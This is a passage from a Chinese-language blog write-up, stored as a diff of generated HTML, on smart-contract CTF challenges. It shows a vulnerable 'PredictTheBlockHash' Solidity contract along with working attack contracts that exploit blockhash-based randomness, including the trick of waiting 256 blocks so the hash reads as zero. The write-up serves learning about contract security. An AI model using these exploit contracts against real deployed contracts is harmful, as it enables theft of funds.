class="built_in">require</span>(<span class="title class_">Myguess</span> == <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now)) % <span class="number">10</span>,<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        challenge.<span class="title function_">settle</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) public payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>部署合约，先调用gue函数设置一个猜测的guess(我选择的5)，再调用set函数直到成功为止即可(运气成分比较大)</p>
+<h2 id="第六题：Guess-the-Hash-Number"><a href="#第六题：Guess-the-Hash-Number" class="headerlink" title="第六题：Guess the Hash Number"></a>第六题：Guess the Hash Number</h2><h3 id="代码：-5"><a href="#代码：-5" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line">contract <span class="title class_">PredictTheBlockHashChallenge</span> &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">PredictTheBlockHashChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">0.001</span> ether);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">bytes32 hash</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(guesser == <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">0.001</span> ether);</span><br><span class="line">        guesser = msg.<span class="property">sender</span>;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.<span class="property">number</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == guesser);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span> &gt; settlementBlockNumber);</span><br><span class="line">        bytes32 answer = block.<span class="title function_">blockhash</span>(settlementBlockNumber);</span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">0.002</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目要求我们猜测下一个区块的256位的Hash值。<br>“出于可扩展性的原因，区块哈希并非对所有区块都可用。您只能访问最近 256 个区块的哈希值，所有其他值将为零。”<br>所以我们只需要等待256个区块就可以解决这个问题。</p>
+<h3 id="攻击代码：-1"><a href="#攻击代码：-1" class="headerlink" title="攻击代码："></a>攻击代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./PredictBlockHash.sol&quot;</span>;</span><br><span class="line">contract attack &#123;</span><br><span class="line">    <span class="title class_">PredictTheBlockHashChallenge</span> challenge;</span><br><span class="line">    uint256 blockNumber;</span><br><span class="line">bytes32 answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params">address _addr</span>) public &#123;</span><br><span class="line">        challenge = <span class="title class_">PredictTheBlockHashChallenge</span>(_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        blockNumber = block.<span class="property">number</span> + <span class="number">1</span>;</span><br><span class="line">        challenge.<span class="property">lockInGuess</span>.<span class="title function_">value</span>(<span class="number">0.001</span> ether)(answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span>-<span class="number">256</span> &gt; blockNumber, <span class="string">&quot;Didn&#x27;t generate 256 blocks&quot;</span>);</span><br><span class="line">        challenge.<span class="title function_">settle</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>部署目标合约和攻击合约：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%876.png" class=""></p>
+<p>先调用攻击合约的guess函数，存入0，等到生成了256个区块之后再来调用pwn函数即可</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/26/Unstoppable/" rel="prev" title="Unstoppable">
+                  <i class="fa fa-chevron-left"></i> Unstoppable
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/11/28/ERC20/" rel="next" title="ERC20">
+                  ERC20 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yuki</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
